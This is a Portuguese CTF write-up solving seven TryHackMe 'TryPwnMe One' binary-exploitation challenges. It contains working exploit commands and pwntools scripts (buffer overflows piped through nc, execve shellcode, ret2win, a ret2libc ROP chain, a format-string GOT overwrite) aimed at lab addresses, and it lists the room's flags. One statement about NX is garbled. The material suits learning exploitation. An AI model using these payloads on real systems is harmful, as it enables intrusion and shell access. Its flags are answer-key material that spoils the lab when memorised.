# TryHackMe - TryPwnMe One

###### Solved by @milelaraia

Esta é uma sala do TryHackMe com 7 desafios sobre pwn.

## Challenge 1 - TryOverFlowMe1

O primeiro desafio pede para conseguir a flag usando um Ip e uma Porta específicos e fornece também o código de referência a seguir e pede para usa-lo para conseguir analisar o binário.

```bash
int main(){
    setup();
    banner();
    int admin = 0;
    char buf[0x10];

    puts("PLease go ahead and leave a comment :");
    gets(buf);

    if (admin){
        const char* filename = "flag.txt";
        FILE* file = fopen(filename, "r");
        char ch;
        while ((ch = fgetc(file)) != EOF) {
            putchar(ch);
    }
    fclose(file);
    }

    else{
        puts("Bye bye\n");
        exit(1);
    }
}
```
Analisando o arquivo em binário:

[![Captura-de-tela-2025-11-05-155620.png](https://i.postimg.cc/wBp8Dk0p/Captura-de-tela-2025-11-05-155620.png)](https://postimg.cc/cvXbSwp9)

[![imagem-2025-11-05-155949169.png](https://i.postimg.cc/s2VHVHTz/imagem-2025-11-05-155949169.png)](https://postimg.cc/Hrh9zzGv)

Podemos ver que é um executável, mas o comando checksec não revelou nada de muito importante, apenas o fato do NX estar desativado, o que significa que ele não é suscetível à inejeção de shellcode.

Vamos analisar no gdb:

[![imagem-2025-11-05-161512112.png](https://i.postimg.cc/bvk69cdM/imagem-2025-11-05-161512112.png)](https://postimg.cc/NyG7Qn67)

No dissasembly vemos que a variável admin tem um total de `44` bytes `(rbp - 0x4)`.

#### Como Prosseguir:

Voltando para o código de referência podemos ver que há um `admin = 0` o que significa que precisamos atribuir um valor à ele para, assim, ter os privilégios de admin e conseguir a flag. Para isso vamos fazer um `buffer overflow` usando o `nc` fornecido e o comando `echo`.

```bash
echo -e "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE\x1\x1\x1\x1\x1\x1\x1\x1" | nc 10.201.19.132 9003
```

#### Resultado:

O intuito do buffer é ultrapassar os bytes permitidos no `admin` para assim conseguir mudar o valor dele e ter acesso à flag.

[![imagem-2025-11-05-163721637.png](https://i.postimg.cc/cCSPn7WV/imagem-2025-11-05-163721637.png)](https://postimg.cc/r0fh6rKJ)

`Flag: THM{Oooooooooooooovvvvverrrflloowwwwww}`

## Challenge 2 - TryOverFlowMe2

No segundo de desafio temos também um código de referência e um Ip/Porta.

```bash
int read_flag(){
        const char* filename = "flag.txt";
        FILE* file = fopen(filename, "r");
        if(!file){
            puts("the file flag.txt is not in the current directory, please contact support\n");
            exit(1);
        }
        char ch;
        while ((ch = fgetc(file)) != EOF) {
        putchar(ch);
    }
    fclose(file);
}

int main(){
    
    setup();
    banner();
    int admin = 0;
    int guess = 1;
    int check = 0;
    char buf[64];

    puts("Please Go ahead and leave a comment :");
    gets(buf);

    if (admin==0x59595959){
            read_flag();
    }

    else{
        puts("Bye bye\n");
        exit(1);
    }
}
```
Além disso ele pergunta qual é o contéudo presente no arquivo `flag.txt`.

#### Código de Referência

Ao analisar o código que nos foi dado, podemos ver que é basicamente o mesmo do desafio passado, a diferença é que `0x59` é simplesmente `Y`. Vamos então fazer novamente um `buffer overflow` para estourar o `admin` e conseguir a flag. 

```bash
echo -e "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY" | nc 10.201.19.132 9004
``` 

#### Resultado:

[![imagem-2025-11-05-170120692.png](https://i.postimg.cc/4nCMgzL0/imagem-2025-11-05-170120692.png)](https://postimg.cc/7JVX1Ty1)

`Flag: THM{why_just_the_A_have_all_theFun?}`

## Challenge 3 - TryExecMe

Temos o mesmo dos anteriores.

```bash
int main(){
    setup();
    banner();
    char *buf[128];   

    puts("\nGive me your shell, and I will execute it: ");
    read(0,buf,sizeof(buf));
    puts("\nExecuting Spell...\n");

    ( ( void (*) () ) buf) ();

}
```
A diferença é que ao executar um `checksec` no executável dessa questão, podemos ver que ele é vulnerável a `shellcode`.

[![imagem-2025-11-05-170738809.png](https://i.postimg.cc/x8kC7Shm/imagem-2025-11-05-170738809.png)](https://postimg.cc/V08mr2Ys)

Sendo assim podemos usar um shellcode do `shellstorm` para conseguir a flag.

```bash
{ echo -e "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; cat; } | nc 10.201.19.132 9005
```
Observação: o `cat` é usado para manter a conexão aberta e permitir interação com a shell aberta pelo shellcode.

#### Resultado: 

[![imagem-2025-11-05-205957402.png](https://i.postimg.cc/RFTZpx9B/imagem-2025-11-05-205957402.png)](https://postimg.cc/cgrW6jr9)

`Flag: THM{Tr1Execm3_with_s0m3_sh3llc0de_w00t}`

## Challenge 4 - TryRetMe

```bash
int win(){ system("/bin/sh"); }

void vuln(){
    char *buf[0x20];
    read(0, buf, 0x200);
}

int main(){ vuln(); }
```

Temos que sobrescrever o endereço de retorno da função para saltar para `win()`.

[![imagem-2025-11-05-204848601.png](https://i.postimg.cc/4yFFXnZ0/imagem-2025-11-05-204848601.png)](https://postimg.cc/hQT0rDX8)

Por ser um binário 64-bit não-PIE, os endereços são fixos. É necessário, porém, ajustar o stack alignment com um `ret` extra. Vamos usar o comando `echo` novamente.

```bash

{ echo -e "AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCC\x1a\x10\x40\x00\x00\x00\x00\x00\xdd\x11\x40\x00\x00\x00\x00\x00"; cat; } | nc 110.201.15.115 9006
```

#### Resultado:

[![Captura-de-tela-2025-11-05-210211.png](https://i.postimg.cc/W39PJNTv/Captura-de-tela-2025-11-05-210211.png)](https://postimg.cc/5YFrhMX7)

`Flag: THM{a_r3t_to_w1n_by_thm}`

## Challenge 5 - Random Memories

Código de referência: 

```bash
int win(){
    system("/bin/sh\0");
}

void vuln(){
    char *buf[0x20];
    printf("I can give you a secret %llx\n", &vuln);
    puts("Where are we going? : ");
    read(0, buf, 0x200);
    puts("\nok, let's go!\n");
}

int main(){
    setup();
    banner();
    vuln();
}
```

Analisando o arquivo do binário com o `file`.

[![imagem-2025-11-05-211119509.png](https://i.postimg.cc/0y5F7gXM/imagem-2025-11-05-211119509.png)](https://postimg.cc/N5VdwncB)

O binário é PIE, mas nos dá um leak do endereço de vuln. Podemos calcular o deslocamento até `win` e construir o payload dinamicamente com Pwntools:

```bash
from pwn import *

p = remote('10.201.15.115', 9007)
p.readuntil(b"secret ")
leak = int(p.readline().strip(), 16)

ret = p64(leak - 767)
win = p64(leak - 265)

payload = b"A"*264 + ret + win
p.sendline(payload)
p.interactive()
```

#### Resultado:

[![Captura-de-tela-2025-11-05-211447.png](https://i.postimg.cc/XJKk2qp5/Captura-de-tela-2025-11-05-211447.png)](https://postimg.cc/YG9F0pN2)

`Flag: THM{Th1s_R4ndom_acc3ss_m3mories_tututut_byp4ssed}`

## Challenge 6 - The Librarian

Código:

```bash
void vuln(){
    char *buf[0x20];
    puts("Again? Where this time? : ");
    read(0, buf, 0x200);
    puts("\nok, let's go!\n");
    }

int main(){
    setup();
    vuln();

}
```

Como não temos a função `win`, precisamos usar funções da `libc (system, /bin/sh)`.

Usamos `puts` para vazar o endereço real e calcular o `libc base`, e depois chamamos `system("/bin/sh")`. Para isso vamos usar o payload em python a seguir:

```bash
from pwn import *

p = remote('10.201.15.115', 9008)
binary = ELF('./thelibrarian')
libc = ELF('./libc.so.6')
rop = ROP(binary)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]
offset = 264

# Leak puts
payload = b'A'*offset + p64(pop_rdi) + p64(binary.got['puts']) + p64(binary.plt['puts']) + p64(binary.symbols['main'])
p.sendline(payload)
p.recvuntil(b"let's go!\n\n")
puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))

# Calcula endereços reais
libc_base = puts_leak - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

# Segunda etapa: chama system("/bin/sh")
payload = b'A'*offset + p64(pop_rdi) + p64(bin_sh) + p64(ret_gadget) + p64(system)
p.sendline(payload)
p.interactive()
```

#### Resultado:

Por algum motivo não consegui fazer com que esse desafio me devolvesse a flag. Mas a lógica do payload está correta.

## Challenge 7 - Not Specified

Código:

```bash
int win(){

    system("/bin/sh\0");

}

int main(){

    setup();

    banner();

    char *username[32];

    puts("Please provide your username\n");

    read(0,username,sizeof(username));

    puts("Thanks! ");

    printf(username);

    puts("\nbye\n");

    exit(1);    

}
```

A vulnerabilidade presente permite sobrescrever endereços arbitrários usando `%n`. O nosso objetivo é redirecionar `puts` para `win`.

Usando o Pwntools: 

```bash
from pwn import *

p = remote('10.201.15.115', 9009)
elf = context.binary = ELF('./notspecified')

payload = fmtstr_payload(6, {elf.got['puts']: elf.sym['win']})
p.sendline(payload)
p.interactive()
```

#### Resultado

[![imagem-2025-11-05-213705274.png](https://i.postimg.cc/5NpFNGHf/imagem-2025-11-05-213705274.png)](https://postimg.cc/ZCBqwwFQ)

`Flag: THM{l3arn1ng_f0rm4t_str1ngs_awes0m3}`

## Conclusão 

O laboratório TryPwnMe One mostra, de forma direta, que vulnerabilidades triviais (uso de gets(), printf(user), execução de dados do cliente) ainda permitem RCE e vazamento de informações. Para ambientes reais isso significa risco imediato de comprometimento de serviço e movimentação lateral.



